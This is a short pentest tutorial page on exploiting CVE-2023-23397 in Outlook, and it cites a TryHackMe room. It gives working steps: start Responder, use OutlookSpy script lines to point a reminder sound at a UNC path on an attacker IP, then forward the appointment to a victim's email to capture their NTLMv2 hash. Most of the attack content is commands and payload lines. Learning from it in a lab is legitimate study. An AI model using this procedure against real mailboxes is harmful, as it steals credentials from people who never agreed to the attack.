# Outlook Reminder Privilege Escalation

The Outlook's Reminder method is vulnerable to privilege escalation by abusing the UNC (Universal Naming Convention) file path of the reminder sound. CVE-2023-23397.

### Exploitation <a href="#exploitation" id="exploitation"></a>

To carry out this attack, the OutlookSpy is required. So please install it before proceeding.

#### 1. Start Responder <a href="#id-1-start-responder" id="id-1-start-responder"></a>

First off, start responder in our local machine to capture NetNTLM authentication.

```
# -I: Interface (eth0, tun0, etc.)
responder -I tun0
```

#### 2. Modify Reminder Settings using OutlookSpy <a href="#id-2-modify-reminder-settings-using-outlookspy" id="id-2-modify-reminder-settings-using-outlookspy"></a>

1. In Outlook, select Home tab and click New Items then choose Appointment in drawer menu.
2. In new Appointment window, select OutlookSpy tab then click CurrentItem. The AppointmentItem window will open.
3.  In AppointmentItem window, click Script tab and input the following value.

    Replace “10.0.0.1” with your local server ip.

    ```
    AppointmentItem.ReminderOverrideDefault = true
    AppointmentItem.ReminderPlaySound = true
    AppointmentItem.ReminderSoundFile ="\\10.0.0.1\test.wav"
    ```

    After that, click Run button to apply the new properties.

    To confirm if the properties applied, click Properties tab and choose the following items in left pane.

    * ReminderOverrideDefault
    * ReminderPlaySound
    * ReminderSoundFile

    Close the AppointmentItem window.

#### 3. Attach New Appointment <a href="#id-3-attach-new-appointment" id="id-3-attach-new-appointment"></a>

1. Click Appointment tab and click Reminder in the Options section. Then set 0 minutes.
2. Fill the Subject, Location and Message with arbitrary values.
3. To send the appointment to the victim address, click Forward in Actions section in Appointment tab. Then enter the victim email address as a destination. Now click Send button.

#### 4. Capture the Victim’s NTLMv2 Hash with Responder <a href="#id-4-capture-the-victims-ntlmv2-hash-with-responder" id="id-4-capture-the-victims-ntlmv2-hash-with-responder"></a>

1. Because we set the reminder with 0 minutes, we should see the reminder popup immediately after saving.
2. In our terminal, responder, that we’ve launched, captured the NTLMv2 hash.

### References <a href="#references" id="references"></a>

* [TryHackMe](https://tryhackme.com/room/outlookntlmleak)
